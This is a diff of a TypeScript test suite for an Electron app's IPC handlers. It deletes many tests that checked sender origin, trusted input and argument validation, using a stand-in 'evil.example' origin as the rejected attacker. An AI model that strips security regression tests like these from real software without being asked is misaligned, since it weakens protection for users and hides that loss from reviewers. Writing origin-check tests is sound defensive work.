@@ -133,7 +133,7 @@ import {
 } from '@/main/browser-import'
 import { getSearchSuggestions } from '@/main/browser-search/suggestions'
 import { trackInputActivity } from '@/main/input-activity'
-import { type IpcDeps, openMicrophoneSettings, registerIpcHandlers } from '@/main/ipc'
+import { type IpcDeps, registerIpcHandlers } from '@/main/ipc'
 import { LocalFilesystemService } from '@/main/local-filesystem'
 import { isLocalPageUrl } from '@/main/local-pages'
 import { TerminalRegistry } from '@/main/terminal/registry'
@@ -247,13 +247,13 @@ const inactiveAppEvent = {
   sender: rejectedSender(),
 }
 const evilEvent = { senderFrame: { url: 'https://evil.example/page' }, sender: evilSender }
-const arbitraryFileEvent = {
+const _arbitraryFileEvent = {
   senderFrame: { url: 'file:///Users/example/private.html' },
   sender: localPageSender,
 }
 /** The chooser anchors a native menu, so it needs a sender with a window. */
 const FAKE_WINDOW = { id: 'main-window' }
-const activeChooserEvent = {
+const _activeChooserEvent = {
   senderFrame: { url: `${APP}/workspace/ws1` },
   sender: activeChooserSender.sender,
 }
@@ -373,33 +373,6 @@ describe('registerIpcHandlers', () => {
     expect(shell.openExternal).toHaveBeenCalledTimes(process.platform === 'darwin' ? 1 : 0)
   })
 
-  it('uses fixed native microphone settings URLs', async () => {
-    await expect(openMicrophoneSettings('darwin')).resolves.toBe(true)
-    expect(shell.openExternal).toHaveBeenLastCalledWith(
-      'x-apple.systempreferences:com.apple.preference.security?Privacy_Microphone'
-    )
-
-    await expect(openMicrophoneSettings('win32')).resolves.toBe(true)
-    expect(shell.openExternal).toHaveBeenLastCalledWith('ms-settings:privacy-microphone')
-    await expect(openMicrophoneSettings('linux')).resolves.toBe(false)
-  })
-
-  it('keeps live search suggestions behind the app origin and privacy preference', async () => {
-    const { invoke } = collectHandlers()
-    const handler = invoke.get('browser-agent:search-suggestions')
-
-    expect(await handler?.(evilEvent, 'sim ai')).toEqual([])
-
-    expect(await handler?.(appEvent, 'sim ai')).toEqual(['sim ai workflow'])
-    expect(getSearchSuggestions).toHaveBeenCalledWith('sim ai')
-
-    vi.mocked(deps.settings.getPreferences).mockReturnValue({
-      ...DEFAULT_DESKTOP_PREFERENCES,
-      browserSearchSuggestionsEnabled: false,
-    })
-    expect(await handler?.(appEvent, 'sim ai')).toEqual([])
-  })
-
   it('restricts the OAuth connect handoff to an activated app origin', async () => {
     const { invoke } = collectHandlers()
     const handler = invoke.get('desktop:oauth-connect')
@@ -431,28 +404,6 @@ describe('registerIpcHandlers', () => {
     expect(await handler?.(activeAppEvent, 'slack', { draftId: '../wrong' })).toBe(false)
     expect(await handler?.(activeAppEvent, 'slack', { chatAttemptId: '../wrong' })).toBe(false)
     expect(await handler?.(activeAppEvent, 'slack', 'not-an-object')).toBe(false)
-  })
-
-  it('restricts updates to an activated app origin', async () => {
-    const { invoke, on } = collectHandlers()
-    const getState = invoke.get('desktop:updates:get-state')
-    expect(await getState?.(evilEvent)).toEqual({ status: 'idle' })
-    expect(await getState?.(appEvent)).toEqual({ status: 'ready', version: '1.2.3' })
-
-    on.get('desktop:updates:check')?.(evilEvent)
-    on.get('desktop:updates:install')?.(evilEvent)
-    expect(deps.updates.check).not.toHaveBeenCalled()
-    expect(deps.updates.install).not.toHaveBeenCalled()
-
-    on.get('desktop:updates:check')?.(appEvent)
-    on.get('desktop:updates:install')?.(appEvent)
-    expect(deps.updates.check).not.toHaveBeenCalled()
-    expect(deps.updates.install).not.toHaveBeenCalled()
-
-    on.get('desktop:updates:check')?.(activeAppEvent)
-    on.get('desktop:updates:install')?.(activeAppEvent)
-    expect(deps.updates.check).toHaveBeenCalledTimes(1)
-    expect(deps.updates.install).toHaveBeenCalledTimes(1)
   })
 
   it('restricts local filesystem access to the app origin', async () => {
@@ -621,139 +572,6 @@ describe('registerIpcHandlers', () => {
     )
   })
 
-  it('restricts desktop settings to the app origin and validates mutations', async () => {
-    const { invoke } = collectHandlers()
-    const get = invoke.get('desktop:settings:get')
-    const set = invoke.get('desktop:settings:set')
-    const setAppearance = invoke.get('desktop:settings:set-appearance')
-    const setBrowserDefaultZoom = invoke.get('desktop:settings:set-browser-default-zoom')
-    const setTerminalDefaultZoom = invoke.get('desktop:settings:set-terminal-default-zoom')
-    const notify = invoke.get('desktop:settings:notify')
-
-    expect(await get?.(evilEvent)).toBeNull()
-    expect(await get?.(appEvent)).toMatchObject({ notificationsEnabled: true })
-
-    await set?.(evilEvent, 'notificationsEnabled', false)
-    await set?.(appEvent, 'not-a-setting', false)
-    await set?.(appEvent, 'notificationsEnabled', 'no')
-    expect(deps.settings.setPreference).not.toHaveBeenCalled()
-
-    await set?.(appEvent, 'notificationsEnabled', false)
-    expect(deps.settings.setPreference).toHaveBeenCalledWith('notificationsEnabled', false)
-
-    await set?.(appEvent, 'launchAtLogin', true)
-    expect(deps.settings.setPreference).not.toHaveBeenCalledWith('launchAtLogin', true)
-    await set?.(activeAppEvent, 'launchAtLogin', true)
-    expect(deps.settings.setPreference).toHaveBeenCalledWith('launchAtLogin', true)
-
-    await setAppearance?.(evilEvent, 'browserTheme', 'dark')
-    await setAppearance?.(appEvent, 'not-a-setting', 'dark')
-    await setAppearance?.(appEvent, 'browserTheme', 'sepia')
-    expect(deps.settings.setAppearancePreference).not.toHaveBeenCalled()
-
-    await setAppearance?.(appEvent, 'browserTheme', 'dark')
-    await setAppearance?.(appEvent, 'terminalTheme', 'app')
-    expect(vi.mocked(deps.settings.setAppearancePreference).mock.calls).toEqual([
-      ['browserTheme', 'dark'],
-      ['terminalTheme', 'app'],
-    ])
-
-    await setBrowserDefaultZoom?.(evilEvent, 125)
-    await setBrowserDefaultZoom?.(appEvent, 123)
-    expect(deps.settings.setBrowserDefaultZoom).not.toHaveBeenCalled()
-
-    await setBrowserDefaultZoom?.(appEvent, 125)
-    expect(deps.settings.setBrowserDefaultZoom).toHaveBeenCalledWith(125)
-
-    await setTerminalDefaultZoom?.(evilEvent, 125)
-    await setTerminalDefaultZoom?.(appEvent, 123)
-    expect(deps.settings.setTerminalDefaultZoom).not.toHaveBeenCalled()
-
-    await setTerminalDefaultZoom?.(appEvent, 125)
-    expect(deps.settings.setTerminalDefaultZoom).toHaveBeenCalledWith(125)
-
-    expect(await notify?.(evilEvent, { title: 'Done', body: 'Ready' })).toBe(false)
-    expect(await notify?.(appEvent, { title: '', body: 'Ready' })).toBe(false)
-    expect(
-      await notify?.(appEvent, { title: 'Done', body: 'Ready', route: '//evil.example' })
-    ).toBe(false)
-    expect(deps.settings.notify).not.toHaveBeenCalled()
-
-    expect(
-      await notify?.(appEvent, {
-        title: 'Task complete',
-        body: 'Sim finished responding.',
-        route: '/workspace/ws1/chat/c1',
-      })
-    ).toBe(true)
-    expect(deps.settings.notify).toHaveBeenCalledWith({
-      title: 'Task complete',
-      body: 'Sim finished responding.',
-      route: '/workspace/ws1/chat/c1',
-    })
-  })
-
-  it('lists profiles and selects one only from an active app interaction', async () => {
-    const { invoke } = collectHandlers()
-    const list = invoke.get('terminal-themes:list-profiles')
-    const selectProfile = invoke.get('terminal-themes:select-profile')
-
-    expect(await list?.(evilEvent)).toEqual([])
-    expect(listTerminalThemeProfiles).not.toHaveBeenCalled()
-
-    const profiles = await list?.(appEvent)
-    expect(profiles).toEqual([
-      expect.objectContaining({ id: 'iterm2:ocean', name: 'Ocean', source: 'iterm2' }),
-    ])
-
-    expect(await selectProfile?.(inactiveAppEvent, 'iterm2:ocean')).toBeNull()
-    expect(deps.settings.selectTerminalProfile).not.toHaveBeenCalled()
-
-    await selectProfile?.(activeAppEvent, 'missing')
-    expect(deps.settings.selectTerminalProfile).not.toHaveBeenCalled()
-
-    await selectProfile?.(activeAppEvent, 'iterm2:ocean')
-    expect(deps.settings.selectTerminalProfile).toHaveBeenCalledWith(
-      expect.objectContaining({ id: 'iterm2:ocean', name: 'Ocean' })
-    )
-  })
-
-  it('opens the browser download-folder picker only from an active app interaction', async () => {
-    const { invoke } = collectHandlers()
-    const choose = invoke.get('desktop:settings:choose-browser-download-directory')
-
-    expect(await choose?.(evilEvent)).toBeNull()
-    expect(await choose?.(inactiveAppEvent)).toBeNull()
-    expect(deps.settings.chooseBrowserDownloadDirectory).not.toHaveBeenCalled()
-
-    await expect(choose?.(activeAppEvent)).resolves.toMatchObject({
-      browserDownloadDirectory: '/tmp/downloads',
-    })
-    expect(deps.settings.chooseBrowserDownloadDirectory).toHaveBeenCalledTimes(1)
-  })
-
-  it('reports native fullscreen state only to the app origin and bundled pages', async () => {
-    const { invoke } = collectHandlers()
-    const getWindowState = invoke.get('desktop:window-state:get')
-
-    expect(await getWindowState?.(evilEvent)).toEqual({ isFullScreen: false })
-    expect(await getWindowState?.(appEvent)).toEqual({ isFullScreen: true })
-    expect(deps.getWindowState).toHaveBeenCalledWith(appSender)
-    expect(await getWindowState?.(localPageEvent)).toEqual({ isFullScreen: true })
-    expect(deps.getWindowState).toHaveBeenCalledWith(localPageSender)
-  })
-
-  it('restricts shell-control channels to bundled local pages', () => {
-    const { on } = collectHandlers()
-
-    on.get('offline:retry')?.(appEvent)
-    expect(deps.retryLoad).not.toHaveBeenCalled()
-    on.get('offline:retry')?.(arbitraryFileEvent)
-    expect(deps.retryLoad).not.toHaveBeenCalled()
-    on.get('offline:retry')?.(localPageEvent)
-    expect(deps.retryLoad).toHaveBeenCalledWith(localPageSender)
-  })
-
   it('registers every channel the preload bridge invokes or sends', () => {
     // The two files share ~20 channel names as bare string literals with
     // nothing tying them together, so a typo on either side is a silently dead
@@ -789,12 +607,6 @@ describe('registerIpcHandlers', () => {
     // comparison rejects even though it is the same origin.
     const explicitPort = { senderFrame: { url: 'https://sim.ai:443/workspace/ws1' } }
     expect(await handler?.(explicitPort)).toMatchObject({ notificationsEnabled: true })
-  })
-
-  it('handles a missing senderFrame safely', async () => {
-    const { invoke } = collectHandlers()
-    expect(await invoke.get('desktop:oauth-connect')?.({ senderFrame: null }, 'slack')).toBe(false)
-    expect(deps.beginOAuthConnect).not.toHaveBeenCalled()
   })
 
   it('restricts browser-agent tool execution to the app origin and known tools', async () => {
@@ -896,25 +708,6 @@ describe('registerIpcHandlers', () => {
     captureBoundary.mockRestore()
   })
 
-  it('routes exact browser-tool cancellation without waiting for authorization', async () => {
-    const { invoke } = collectHandlers()
-    const cancel = vi.spyOn(browserDriver, 'cancelTool').mockReturnValue(true)
-    const cancelActive = vi.spyOn(browserDriver, 'cancelActiveTool').mockReturnValue(true)
-    const handler = invoke.get('browser-agent:cancel-tool')
-    const activeHandler = invoke.get('browser-agent:cancel-active-tool')
-
-    await expect(handler?.(appEvent, 'tool-1', 'chat-1')).resolves.toBe(true)
-    expect(cancel).toHaveBeenCalledWith('chat-1', 'tool-1')
-    await expect(activeHandler?.(appEvent, 'chat-reloaded')).resolves.toBe(true)
-    expect(cancelActive).toHaveBeenCalledWith('chat-reloaded')
-    await expect(handler?.(evilEvent, 'tool-2', 'chat-1')).resolves.toBe(false)
-    await expect(activeHandler?.(evilEvent, 'chat-reloaded')).resolves.toBe(false)
-    expect(cancel).toHaveBeenCalledTimes(1)
-    expect(cancelActive).toHaveBeenCalledTimes(1)
-    cancel.mockRestore()
-    cancelActive.mockRestore()
-  })
-
   it('rejects browser tools whose server authorization exceeds its execution budget', async () => {
     const { invoke } = collectHandlers()
     const executeTool = vi.spyOn(browserDriver, 'executeTool')
@@ -974,40 +767,6 @@ describe('registerIpcHandlers', () => {
       ok: false,
       error: expect.stringContaining('authorized pending Copilot tool call'),
     })
-  })
-
-  it('rejects a retired browser tool even if authorization echoes it', async () => {
-    const { invoke } = collectHandlers()
-    const executeTool = vi.spyOn(browserDriver, 'executeTool')
-    const authorizedEvent = {
-      senderFrame: { url: `${APP}/workspace/ws1` },
-      sender: {
-        session: {
-          fetch: vi.fn(async () =>
-            Response.json({
-              chatId: 'chat-1',
-              toolName: 'browser_request_takeover',
-              args: { reason: 'Legacy handoff' },
-            })
-          ),
-        },
-      },
-    }
-
-    await expect(
-      invoke.get('browser-agent:execute-tool')?.(
-        authorizedEvent,
-        'tool-retired',
-        'browser_request_takeover',
-        {},
-        'chat-1'
-      )
-    ).resolves.toMatchObject({
-      ok: false,
-      error: expect.stringContaining('authorized pending Copilot tool call'),
-    })
-    expect(executeTool).not.toHaveBeenCalled()
-    executeTool.mockRestore()
   })
 
   it('rejects a browser tool authorized after its scope cancellation boundary', async () => {
@@ -1115,22 +874,6 @@ describe('registerIpcHandlers', () => {
     panelAction.mockRestore()
   })
 
-  it('requires trusted input for user navigation', async () => {
-    const { invoke, on } = collectHandlers()
-    const panelAction = vi.spyOn(browserDriver, 'handlePanelAction').mockResolvedValue()
-    const handler = on.get('browser-agent:panel-action')
-    const action = { action: 'navigate', url: 'https://docs.example/page' }
-
-    await invoke.get('browser-agent:activate-scope')?.(inactiveAppEvent, 'chat-navigation')
-    handler?.(inactiveAppEvent, action, 'chat-navigation')
-    expect(panelAction).not.toHaveBeenCalled()
-
-    await invoke.get('browser-agent:activate-scope')?.(activeAppEvent, 'chat-navigation')
-    handler?.(activeAppEvent, action, 'chat-navigation')
-    expect(panelAction).toHaveBeenCalledExactlyOnceWith('chat-navigation', action)
-    panelAction.mockRestore()
-  })
-
   it('canonicalizes and validates panel navigation URLs before they reach the driver', async () => {
     const { invoke, on } = collectHandlers()
     const panelAction = vi.spyOn(browserDriver, 'handlePanelAction').mockResolvedValue()
@@ -1152,243 +895,6 @@ describe('registerIpcHandlers', () => {
       url: CANONICAL_BROWSER_URL,
     })
     panelAction.mockRestore()
-  })
-
-  it('ignores browser-agent panel actions from outside the app origin', () => {
-    const { on } = collectHandlers()
-    const handler = on.get('browser-agent:panel-action')
-    // Malformed and foreign-origin actions are dropped without throwing.
-    expect(() => handler?.(evilEvent, { action: 'reload' })).not.toThrow()
-    expect(() => handler?.(appEvent, 'not-an-object')).not.toThrow()
-    expect(() => handler?.(appEvent, { action: 'reload' })).not.toThrow()
-  })
-
-  it('restricts browser-tab reordering to typed app-origin messages', () => {
-    const { on } = collectHandlers()
-    const handler = on.get('browser-agent:reorder-tab')
-
-    expect(() => handler?.(evilEvent, '1', 0)).not.toThrow()
-    expect(() => handler?.(appEvent, 1, 0)).not.toThrow()
-    expect(() => handler?.(appEvent, '1', '0')).not.toThrow()
-    expect(() => handler?.(appEvent, '1', Number.NaN)).not.toThrow()
-    expect(() => handler?.(appEvent, '1', 0)).not.toThrow()
-  })
-
-  it('restricts browser-panel focus updates to boolean app-origin messages', () => {
-    const { on } = collectHandlers()
-    const handler = on.get('browser-agent:set-panel-focused')
-
-    expect(() => handler?.(evilEvent, true, 'chat-a')).not.toThrow()
-    expect(() => handler?.(appEvent, 'yes', 'chat-a')).not.toThrow()
-    expect(() => handler?.(appEvent, true, 'chat-a')).not.toThrow()
-    expect(deps.browserPanel.setFocused).toHaveBeenCalledWith(appSender, true, 'chat-a')
-  })
-
-  it('routes validated browser-panel bounds with the originating app window sender', () => {
-    const { on } = collectHandlers()
-    const handler = on.get('browser-agent:set-panel-bounds')
-    const bounds = { x: 100, y: 50, width: 800, height: 600 }
-
-    handler?.(evilEvent, bounds, null, 'chat-a')
-    handler?.(appEvent, { ...bounds, width: Number.NaN }, null, 'chat-a')
-    expect(deps.browserPanel.setBounds).not.toHaveBeenCalled()
-
-    handler?.(appEvent, bounds, null, 'chat-a')
-    handler?.(appEvent, null, null, 'chat-a')
-    expect(deps.browserPanel.setBounds).toHaveBeenNthCalledWith(
-      1,
-      appSender,
-      bounds,
-      undefined,
-      'chat-a'
-    )
-    expect(deps.browserPanel.setBounds).toHaveBeenNthCalledWith(
-      2,
-      appSender,
-      null,
-      undefined,
-      'chat-a'
-    )
-  })
-
-  it('captures and swaps the browser panel only for its active app scope', async () => {
-    const { invoke } = collectHandlers()
-
-    await expect(
-      invoke.get('browser-agent:capture-panel-snapshot')?.(activeAppEvent, 'chat-a')
-    ).resolves.toMatchObject({ tabId: 'tab-1', zoomPercent: 100 })
-    expect(deps.browserPanel.captureSnapshot).toHaveBeenCalledWith(activeSender.sender, 'chat-a')
-
-    await expect(
-      invoke.get('browser-agent:set-panel-occluded')?.(activeAppEvent, true, 'chat-a')
-    ).resolves.toBe(true)
-    expect(deps.browserPanel.setOccluded).toHaveBeenCalledWith(
-      activeSender.sender,
-      true,
-      'chat-a',
-      false
-    )
-
-    await expect(
-      invoke.get('browser-agent:set-panel-occluded')?.(activeAppEvent, true, 'chat-a', true)
-    ).resolves.toBe(true)
-    expect(deps.browserPanel.setOccluded).toHaveBeenLastCalledWith(
-      activeSender.sender,
-      true,
-      'chat-a',
-      true
-    )
-
-    await expect(
-      invoke.get('browser-agent:set-panel-occluded')?.(activeAppEvent, 'yes', 'chat-a')
-    ).resolves.toBe(false)
-    await expect(
-      invoke.get('browser-agent:set-panel-occluded')?.(activeAppEvent, true, 'chat-a', 'yes')
-    ).resolves.toBe(false)
-  })
-
-  it('drops stale browser-panel bounds after another chat is activated', async () => {
-    const { invoke, on } = collectHandlers()
-    const bounds = { x: 100, y: 50, width: 800, height: 600 }
-
-    await invoke.get('browser-agent:activate-scope')?.(appEvent, 'chat-b')
-    on.get('browser-agent:set-panel-bounds')?.(appEvent, bounds, null, 'chat-a')
-    expect(deps.browserPanel.setBounds).not.toHaveBeenCalled()
-
-    on.get('browser-agent:set-panel-bounds')?.(appEvent, bounds, null, 'chat-b')
-    expect(deps.browserPanel.setBounds).toHaveBeenCalledWith(appSender, bounds, undefined, 'chat-b')
-  })
-
-  it('keeps download metadata chat-scoped and gates Finder actions on user input', async () => {
-    const state = {
-      scopeId: 'chat-b',
-      downloads: [
-        {
-          id: 'download-1',
-          filename: 'report.csv',
-          state: 'completed' as const,
-          receivedBytes: 100,
-          totalBytes: 100,
-          startedAt: '2026-07-31T12:00:00.000Z',
-        },
-      ],
-    }
-    const getState = vi.spyOn(browserSession, 'getBrowserDownloadsState').mockReturnValue(state)
-    const showMenu = vi.spyOn(browserSession, 'showBrowserDownloadsMenu').mockReturnValue(true)
-    const showToolbar = vi.spyOn(browserDriver, 'showToolbarMenu').mockReturnValue(true)
-    const showInFolder = vi
-      .spyOn(browserSession, 'showBrowserDownloadInFolder')
-      .mockReturnValue(true)
-    const { invoke } = collectHandlers()
-
-    await invoke.get('browser-agent:activate-scope')?.(activeAppEvent, 'chat-b')
-    await expect(
-      invoke.get('browser-agent:get-downloads-state')?.(activeAppEvent, 'chat-a')
-    ).resolves.toEqual({ downloads: [] })
-    await expect(
-      invoke.get('browser-agent:get-downloads-state')?.(activeAppEvent, 'chat-b')
-    ).resolves.toEqual(state)
-    expect(getState).toHaveBeenCalledWith('chat-b')
-
-    await expect(
-      invoke.get('browser-agent:show-downloads-menu')?.(
-        inactiveAppEvent,
-        { x: 10, y: 20 },
-        'chat-b'
-      )
-    ).resolves.toBe(false)
-    await expect(
-      invoke.get('browser-agent:show-downloads-menu')?.(activeAppEvent, { x: 10, y: 20 }, 'chat-b')
-    ).resolves.toBe(true)
-    expect(showMenu).toHaveBeenCalledWith('chat-b', FAKE_WINDOW, { x: 10, y: 20 })
-
-    await expect(
-      invoke.get('browser-agent:show-toolbar-menu')?.(activeAppEvent, { x: 30, y: 40 }, 'chat-b')
-    ).resolves.toBe(true)
-    expect(showToolbar).toHaveBeenCalledWith('chat-b', FAKE_WINDOW, { x: 30, y: 40 })
-
-    await expect(
-      invoke.get('browser-agent:show-download-in-folder')?.(
-        inactiveAppEvent,
-        'download-1',
-        'chat-b'
-      )
-    ).resolves.toBe(false)
-    await expect(
-      invoke.get('browser-agent:show-download-in-folder')?.(activeAppEvent, 'download-1', 'chat-b')
-    ).resolves.toBe(true)
-    expect(showInFolder).toHaveBeenCalledWith('chat-b', 'download-1')
-
-    getState.mockRestore()
-    showMenu.mockRestore()
-    showToolbar.mockRestore()
-    showInFolder.mockRestore()
-  })
-
-  it('restores only the browser scope active for that renderer', async () => {
-    const tabsState = {
-      scopeId: 'chat-b',
-      tabs: [
-        {
-          tabId: '1',
-          url: 'https://restored.example/',
-          title: 'Restored',
-          loading: false,
-          active: true,
-        },
-      ],
-      activeTabId: '1',
-    }
-    const restore = vi.spyOn(browserDriver, 'restoreBrowserScope').mockReturnValue(tabsState)
-    const { invoke } = collectHandlers()
-
-    await invoke.get('browser-agent:activate-scope')?.(appEvent, 'chat-b')
-    await expect(invoke.get('browser-agent:restore-scope')?.(appEvent, 'chat-a')).resolves.toEqual({
-      tabs: [],
-      activeTabId: null,
-    })
-    await expect(invoke.get('browser-agent:restore-scope')?.(appEvent, 'chat-b')).resolves.toEqual(
-      tabsState
-    )
-    expect(restore).toHaveBeenCalledOnce()
-    expect(restore).toHaveBeenCalledWith('chat-b')
-
-    restore.mockRestore()
-  })
-
-  it('creates browser tabs through an acknowledged active-scope operation', async () => {
-    const tabsState = {
-      scopeId: 'chat-b',
-      tabs: [
-        {
-          tabId: '2',
-          url: '',
-          title: '',
-          loading: false,
-          active: true,
-        },
-      ],
-      activeTabId: '2',
-    }
-    const add = vi.spyOn(browserSession, 'addTab').mockReturnValue({} as never)
-    const peek = vi.spyOn(browserSession, 'peekTabsState').mockReturnValue(tabsState)
-    const { invoke } = collectHandlers()
-
-    await invoke.get('browser-agent:activate-scope')?.(appEvent, 'chat-b')
-    peek.mockClear()
-    await expect(invoke.get('browser-agent:open-tab')?.(appEvent, 'chat-b')).resolves.toEqual(
-      tabsState
-    )
-    await expect(invoke.get('browser-agent:open-tab')?.(evilEvent, 'chat-b')).resolves.toEqual({
-      scopeId: '',
-      tabs: [],
-      activeTabId: null,
-    })
-
-    expect(add).toHaveBeenCalledOnce()
-    expect(peek).toHaveBeenCalledOnce()
-    add.mockRestore()
-    peek.mockRestore()
   })
 
   it('atomically creates and navigates a canonical user URL only from trusted input', async () => {
@@ -1433,52 +939,6 @@ describe('registerIpcHandlers', () => {
     peek.mockRestore()
   })
 
-  it('routes browser scope events after activation and a valid provisional migration', async () => {
-    const migrate = vi.spyOn(browserDriver, 'migrateBrowserScope').mockReturnValue(true)
-    const { invoke } = collectHandlers()
-
-    await invoke.get('browser-agent:activate-scope')?.(appEvent, 'pending:new')
-    expect(deps.scopeEvents.activateBrowser).toHaveBeenCalledWith(appSender, 'pending:new')
-
-    await invoke.get('browser-agent:migrate-scope')?.(appEvent, 'pending:new', 'chat-durable')
-    expect(migrate).toHaveBeenCalledOnce()
-    expect(migrate).toHaveBeenCalledWith('pending:new', 'chat-durable')
-    expect(deps.scopeEvents.activateBrowser).toHaveBeenLastCalledWith(appSender, 'chat-durable')
-
-    migrate.mockRestore()
-  })
-
-  it('migrates an owned hidden browser scope without changing the visible chat route', async () => {
-    const migrate = vi.spyOn(browserDriver, 'migrateBrowserScope').mockReturnValue(true)
-    const { invoke, on } = collectHandlers()
-    const bounds = { x: 100, y: 50, width: 800, height: 600 }
-    const migrateScope = invoke.get('browser-agent:migrate-scope')
-
-    await invoke.get('browser-agent:activate-scope')?.(appEvent, 'pending:hidden')
-    await invoke.get('browser-agent:activate-scope')?.(appEvent, 'chat-visible')
-    await migrateScope?.(appEvent, 'pending:hidden', 'chat-durable')
-
-    expect(migrate).toHaveBeenCalledOnce()
-    expect(deps.scopeEvents.activateBrowser).toHaveBeenLastCalledWith(appSender, 'chat-visible')
-    expect(deps.scopeEvents.activateBrowser).not.toHaveBeenCalledWith(appSender, 'chat-durable')
-
-    on.get('browser-agent:set-panel-bounds')?.(appEvent, bounds, null, 'chat-visible')
-    expect(deps.browserPanel.setBounds).toHaveBeenCalledWith(
-      appSender,
-      bounds,
-      undefined,
-      'chat-visible'
-    )
-
-    await expect(migrateScope?.(appEvent, 'pending:hidden', 'chat-replay')).resolves.toEqual({
-      tabs: [],
-      activeTabId: null,
-    })
-    expect(migrate).toHaveBeenCalledOnce()
-
-    migrate.mockRestore()
-  })
-
   it('denies browser scope rekeys unless the sender owns a provisional source', async () => {
     const migrate = vi.spyOn(browserDriver, 'migrateBrowserScope').mockReturnValue(true)
     const { invoke } = collectHandlers()
@@ -1507,145 +967,6 @@ describe('registerIpcHandlers', () => {
     expect(deps.scopeEvents.activateBrowser).toHaveBeenCalledTimes(1)
 
     migrate.mockRestore()
-  })
-
-  it('keeps the browser sender on its provisional scope when migration fails', async () => {
-    const migrate = vi.spyOn(browserDriver, 'migrateBrowserScope').mockReturnValue(false)
-    const { invoke, on } = collectHandlers()
-    const bounds = { x: 100, y: 50, width: 800, height: 600 }
-
-    await invoke.get('browser-agent:activate-scope')?.(appEvent, 'pending:active')
-    await invoke.get('browser-agent:migrate-scope')?.(appEvent, 'pending:active', 'chat-durable')
-    on.get('browser-agent:set-panel-bounds')?.(appEvent, bounds, null, 'pending:active')
-
-    expect(deps.browserPanel.setBounds).toHaveBeenCalledWith(
-      appSender,
-      bounds,
-      undefined,
-      'pending:active'
-    )
-    expect(deps.scopeEvents.activateBrowser).not.toHaveBeenCalledWith(appSender, 'chat-durable')
-
-    migrate.mockRestore()
-  })
-
-  it('only disposes provisional browser scopes from the app origin', async () => {
-    const { invoke } = collectHandlers()
-    const dispose = invoke.get('browser-agent:dispose-scope')
-
-    expect(await dispose?.(evilEvent, 'pending:new')).toBe(false)
-    expect(await dispose?.(appEvent, 'chat-durable')).toBe(false)
-    expect(await dispose?.(appEvent, 'pending:new')).toBe(true)
-  })
-
-  it('disposes provisional native scopes when their renderer fully navigates away', async () => {
-    const listeners = new Map<string, (...args: unknown[]) => void>()
-    const sender = {
-      session: appSender.session,
-      isDestroyed: () => false,
-      on: (channel: string, listener: (...args: unknown[]) => void) => {
-        listeners.set(channel, listener)
-      },
-    }
-    const event = {
-      senderFrame: { url: `${APP}/workspace/ws1` },
-      sender,
-    } as unknown as Parameters<Handler>[0]
-    const disposeBrowser = vi.spyOn(browserDriver, 'disposeBrowserScope')
-    const disposeTerminal = vi.spyOn(deps.terminal, 'disposeScope')
-    const { invoke } = collectHandlers()
-
-    await invoke.get('browser-agent:activate-scope')?.(event, 'pending:reload')
-    await invoke.get('terminal:activate-scope')?.(event, 'pending:reload')
-
-    listeners.get('did-start-navigation')?.({}, 'https://sim.ai/next', true, true)
-    expect(disposeBrowser).not.toHaveBeenCalled()
-    expect(disposeTerminal).not.toHaveBeenCalled()
-
-    listeners.get('did-start-navigation')?.({}, 'https://sim.ai/next', false, true)
-    expect(disposeBrowser).toHaveBeenCalledWith('pending:reload')
-    expect(disposeTerminal).toHaveBeenCalledWith('pending:reload')
-
-    disposeBrowser.mockRestore()
-  })
-
-  it('suspends only durable browser scopes from the app origin', async () => {
-    const suspendScope = vi.spyOn(browserDriver, 'suspendBrowserScope').mockReturnValue(true)
-    const { invoke } = collectHandlers()
-    const suspend = invoke.get('browser-agent:suspend-scope')
-
-    expect(await suspend?.(evilEvent, 'chat-durable')).toBe(false)
-    expect(await suspend?.(appEvent, 'not valid!')).toBe(false)
-    expect(await suspend?.(appEvent, 'pending:new')).toBe(false)
-    expect(await suspend?.(appEvent, 'chat-durable')).toBe(true)
-    expect(suspendScope).toHaveBeenCalledOnce()
-    expect(suspendScope).toHaveBeenCalledWith('chat-durable')
-    expect(deps.scopeEvents.sendBrowser).toHaveBeenCalledWith(
-      'chat-durable',
-      'browser-agent:scope-suspended',
-      'chat-durable'
-    )
-
-    suspendScope.mockRestore()
-  })
-
-  it('forwards a well-formed panel anchor and drops a malformed one', () => {
-    const { on } = collectHandlers()
-    const handler = on.get('browser-agent:set-panel-bounds')
-    const bounds = { x: 100, y: 50, width: 800, height: 600 }
-    const anchor = { viewportWidth: 1600, viewportHeight: 900, widthRatio: 0.5 }
-
-    handler?.(appEvent, bounds, anchor, 'chat-a')
-    expect(deps.browserPanel.setBounds).toHaveBeenLastCalledWith(
-      appSender,
-      bounds,
-      anchor,
-      'chat-a'
-    )
-
-    // A bad anchor must not take the bounds down with it — the rect still
-    // applies, the shell just loses the resize optimization.
-    handler?.(appEvent, bounds, { ...anchor, widthRatio: Number.NaN }, 'chat-a')
-    expect(deps.browserPanel.setBounds).toHaveBeenLastCalledWith(
-      appSender,
-      bounds,
-      undefined,
-      'chat-a'
-    )
-    handler?.(appEvent, bounds, { ...anchor, viewportWidth: 0 }, 'chat-a')
-    expect(deps.browserPanel.setBounds).toHaveBeenLastCalledWith(
-      appSender,
-      bounds,
-      undefined,
-      'chat-a'
-    )
-    handler?.(appEvent, bounds, 'nonsense', 'chat-a')
-    expect(deps.browserPanel.setBounds).toHaveBeenLastCalledWith(
-      appSender,
-      bounds,
-      undefined,
-      'chat-a'
-    )
-  })
-
-  it('restricts browser theme updates to known app-origin preferences', () => {
-    const { on } = collectHandlers()
-    const handler = on.get('browser-agent:set-theme')
-
-    expect(() => handler?.(evilEvent, 'dark')).not.toThrow()
-    expect(() => handler?.(appEvent, 'sepia')).not.toThrow()
-    expect(() => handler?.(appEvent, 'system')).not.toThrow()
-  })
-
-  it('restricts Chrome profile discovery to the app origin', async () => {
-    const { invoke } = collectHandlers()
-    const handler = invoke.get('browser-import:list-profiles')
-
-    expect(await handler?.(evilEvent)).toEqual([])
-    expect(await handler?.(localPageEvent)).toEqual([])
-    expect(listChromeImportProfiles).not.toHaveBeenCalled()
-
-    expect(await handler?.(appEvent)).toEqual([{ id: 'Default', label: 'Person 1' }])
   })
 
   it('requires a live user gesture before importing Chrome cookies', async () => {
@@ -1678,29 +999,6 @@ describe('registerIpcHandlers', () => {
     expect(importChromeCookies).not.toHaveBeenCalled()
   })
 
-  it('refuses Chrome import while the browser surface is switched off', async () => {
-    deps.settings.getPreferences = vi.fn(() => ({
-      ...DEFAULT_DESKTOP_PREFERENCES,
-      browserEnabled: false,
-    }))
-    const { invoke } = collectHandlers()
-
-    expect(await invoke.get('browser-import:list-profiles')?.(appEvent)).toEqual([])
